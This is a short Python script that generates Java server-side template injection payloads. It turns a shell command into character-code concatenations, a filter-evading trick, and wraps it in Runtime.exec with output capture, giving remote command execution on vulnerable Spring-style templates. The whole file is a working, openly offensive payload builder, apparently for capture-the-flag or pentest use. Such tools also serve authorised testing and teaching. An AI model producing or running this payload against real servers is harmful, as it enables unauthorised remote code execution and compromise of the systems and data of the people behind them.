#!/usr/bin/env python3

import argparse

# vuln_param_name = "name"


def construct_path(cmd):
    final_str = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("
    first = True
    for char in cmd:
        if first:
            first = False
            final_str += f"T(java.lang.Character).toString({str(ord(char))})"
        else:
            final_str += f".concat(T(java.lang.Character).toString({str(ord(char))}))"
    final_str += ").getInputStream())}"
    return final_str



parser = argparse.ArgumentParser(description='Script generate automatically cmd to inject with Java SSTI attack')
# Commented as the port might be given inside host parameter...
# parser.add_argument('-p', '--port', default=80, type=int, help='Target port')
#parser.add_argument('--host', type=str, required=True, help='Remote http vulnerable server')
parser.add_argument('--cmd', type=str, required=True, help='Remote cmd to exec')

args = parser.parse_args()

print(construct_path(cmd=args.cmd))


